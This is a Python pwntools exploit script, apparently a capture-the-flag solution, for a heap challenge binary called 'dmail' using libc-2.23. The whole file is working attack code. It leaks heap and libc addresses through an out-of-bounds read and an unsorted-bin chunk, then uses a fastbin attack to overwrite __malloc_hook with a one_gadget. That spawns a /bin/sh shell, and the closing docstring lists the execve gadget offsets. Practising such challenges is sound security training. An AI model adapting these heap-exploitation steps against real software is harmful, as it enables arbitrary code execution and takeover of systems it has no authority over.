#!/usr/bin/env python3
#coding=utf8
from pwn import *
import sys
context.log_level = 'debug'


rv 		= lambda x=0x1000 : con.recv(x)
rl 		= lambda   : con.recvline()
ru 		= lambda x : con.recvuntil(x)
raddr 	= lambda   : u64(con.recvuntil('\n')[:-1].ljust(8,b'\x00'))
raddrn 	= lambda x : u64(rv(x).ljust(8,b'\x00'))
sd 		= lambda x : con.send(x)
sl 		= lambda x : con.sendline(x)
sa 		= lambda a,b : con.sendafter(a,b)
sla 	= lambda a,b : con.sendlineafter(a,b)
ss 		= lambda s : success(s) 
stop    = lambda   : raw_input("<STOP>")


def add(index, length, data):
    sl("1")
    ru(" cubby: ")
    sl(str(index))
    ru("  length: ")
    sl(str(length))
    ru("  body: ")
    sl(data)

def show(index):
    sl("2")
    ru(" cubby: ")
    sl(str(index))

def remove(index):
    sl("3")
    ru(" cubby: ")
    sl(str(index))

con = process("./dmail")
libc = ELF("./libc-2.23.so")
add(0,0x100,"")
add(10, 0x100, "a")
add(11, 0x10, "skip")

add(34, 0x100, "a")
add(12, 0x60, "skip")
add(13, 0x10, "skip")
show(0)

# 0、通过越界读leak堆地址
one_leak = con.recvuntil("1 -> send mail")
leak_heap = u64((one_leak[:-15]).ljust(8,b'\x00'))
print("[*heap leak] ", hex(leak_heap))

# 1、通过0号 构造出unsortbin完成leak libc base
remove(0)
add(0,0,"")
show(0)
one_leak = con.recvuntil("1 -> send mail")
leak_libc = u64((one_leak[:-15]).ljust(8,b'\x00')) - 3951736
print("[*libc_base] ", hex(leak_libc))

# 2

__malloc_hook = leak_libc + libc.symbols['__malloc_hook']
__one_gadget = leak_libc + 0x4526a
remove(0)
add(0,0x60,"")
remove(0)
remove(12)
add(38,0x60,p64(0)+p64(0x71)+p64(__malloc_hook-0x23))

add(14,0x60,"")
add(15,0x60,"")
add(16,0x60,b"a"*0x13 + p64(__one_gadget))


sl("1")
ru(" cubby: ")
sl(str(20))
ru("  length: ")
sl(str(0x30))
sl("ls && echo 'get the flag'")
con.interactive()

"""
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
"""